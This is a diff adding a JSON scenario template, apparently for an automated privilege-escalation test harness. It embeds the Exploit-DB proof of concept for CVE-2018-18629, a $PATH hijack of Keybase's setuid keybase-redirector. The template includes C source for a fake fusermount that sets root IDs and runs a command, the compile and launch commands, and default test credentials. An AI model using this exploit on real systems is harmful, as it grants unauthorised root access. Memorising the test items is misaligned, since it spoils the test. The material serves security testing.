@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_46044",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: Keybase keybase-redirector - '$PATH' Local Privilege Escalation (CVE-2018-18629)\n\nExploit source code (46044.md):\n```\nkeybase-redirector is a setuid root binary. keybase-redirector calls the fusermount binary using a relative path and the application trusts the value of $PATH. This allows a local, unprivileged user to trick the application to executing a custom fusermount binary as root.\n\n## Environment\n\nCentOS Linux release 7.4.1708 (Core)\n3.10.0-693.17.1.el7.x86_64\n\nRPM info\n\n```\nName        : keybase\nVersion     : 2.8.0.20181017144746.3efc4cbf3c\nRelease     : 1\nArchitecture: x86_64\nInstall Date: Mon 22 Oct 2018 05:30:36 PM EDT\nGroup       : Unspecified\nSize        : 273302678\nLicense     : BSD\nSignature   : RSA/SHA256, Wed 17 Oct 2018 10:55:21 AM EDT, Key ID 47484e50656d16c7\nSource RPM  : keybase-2.8.0.20181017144746.3efc4cbf3c-1.src.rpm\nBuild Date  : Wed 17 Oct 2018 10:54:47 AM EDT\nBuild Host  : 6ae61e160e87\nRelocations : (not relocatable)\nSummary     : Keybase command line client\nDescription :\nKeybase command line client\n```\n\nAn unprivileged user named user1 is used for this PoC.\n\n## Steps to reproduce\n\n1) Display privileges of user 1 - execute the id command\n\n```\n[user1@localhost woot]$ id\nuid=1000(user1) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n```\n\n2) Create a custom fusermount application. This PoC will create /w00t as root. Arbitrary commands can be executed.\n\n```\ncat >fusermount.c<<EOF\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(int argc, char **argv)\n{\n  setreuid(0,0);\n  system(\"/usr/bin/touch /w00t\");\n  return(0);\n}\nEOF\n``\n\n3) Compile fusermount.c\n\n```\ngcc -Wall fusermount.c -o fusermount\n```\n\n4) Verify that /w00t does not exist.\n\n```\n[user1@localhost woot]$ ls -ld /w00t\nls: cannot access /w00t: No such file or directory\n```\n\n5) Prepend the PATH environment variable with a dot(for current working directory) and execute keybase-redirector which in turn will execute the malicious fusermount binary as root.\n\n```\nenv PATH=.:$PATH /usr/bin/keybase-redirector /keybase\n```\n\n6) Enter the control-c sequence to kill the application.\n\n```\n[user1@localhost woot]$ env PATH=.:$PATH /usr/bin/keybase-redirector /keybase\n^C\n```\n\n7) Verify that /w00t exists\n\n```\n[user1@localhost woot]$ ls -ld /w00t\n-rw-rw-r--. 1 root user1 0 Oct 22 16:34 /w00t\n[user1@localhost woot]$\n```\n\n## Impact\n\nUnauthorized root access is possible which impacts the confidentially, integrity, and availability of the system.\n```",
+  "cve": "CVE-2018-18629",
+  "exploitdb_id": "46044",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46044",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
